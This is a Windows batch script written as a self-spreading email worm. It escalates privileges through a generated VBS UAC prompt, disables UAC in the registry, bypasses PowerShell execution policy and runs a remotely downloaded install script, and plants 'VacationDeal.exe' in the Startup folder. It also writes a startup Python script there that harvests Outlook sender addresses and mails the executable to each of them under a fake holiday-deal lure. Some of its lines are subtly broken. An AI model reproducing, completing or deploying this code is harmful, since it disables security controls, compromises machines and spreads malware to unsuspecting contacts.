    @echo off
    
    ::Check for permissions
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
    
    ::If error flag set, we do not have admin.
    if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
    ) else ( goto gotAdmin )
    
    ::UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
   echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    
    %temp%\getadmin.vbs
    del "%temp%\getadmin.vbs"
    exit /B
    
    ::gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

    
    ::installing python
    echo New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force >script.ps1
    echo Set-ExecutionPolicy AllSigned -force >>script.ps1
    echo Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))>>script.ps1
    echo choco install -y python >>script.ps1
    echo python get-pip.py >>script.ps1
    echo pip install pywin32 >>script.ps1
    
    ::creating python script to spread over email. The file is placed in a directory that runs everytime the computer turns on
    PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""script.ps1""' -windowstyle hidden -Verb RunAs}"
    MOVE VacationDeal.exe C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
    echo import win32com.client as win32 > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo from win32com.client import Dispatch >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo f = open('contacts.txt', 'w+')>> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo f.close()>> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo outlook = Dispatch("Outlook.Application").GetNamespace("MAPI")>> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo inbox = outlook.GetDefaultFolder("6")>> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo all_inbox = inbox.Items>> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo folders = inbox.Folders>> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    
    echo for msg in all_inbox: >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo        if msg.Class==43:>> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo            if msg.SenderEmailType=='EX': >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo                print (msg.Sender.GetExchangeUser().PrimarySmtpAddress) >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo                sender = msg.Sender.GetExchangeUser().PrimarySmtpAddress >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo                with open("contacts.txt", "a") as myfile: >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo                         myfile.write(sender +"\n") >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo            else: >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo                print (msg.SenderEmailAddress) >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo                sender = msg.SenderEmailAddress >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo                with open("contacts.txt", "a") as myfile: >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
     echo                         myfile.write(sender +"\n") >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo filepath = 'contacts.txt' >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo with open(filepath) as fp: >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo    line = fp.readline() >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo    while line: >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo        line = fp.readline() >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo        outlook = win32.Dispatch('outlook.application') >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo        mail = outlook.CreateItem(0) >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo        mail.To = line >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo        #need to change text >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo        mail.Subject = ' Fwd: Holiday Vacation' >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo        mail.body = ' I just signed up, you should too! Just fill out the attachment' >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
    echo        attachment = "VacationDeal.exe"
    echo        mail.Attachments.Add(attachment)
    echo        mail.send >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\autorun.py"
   
    pause
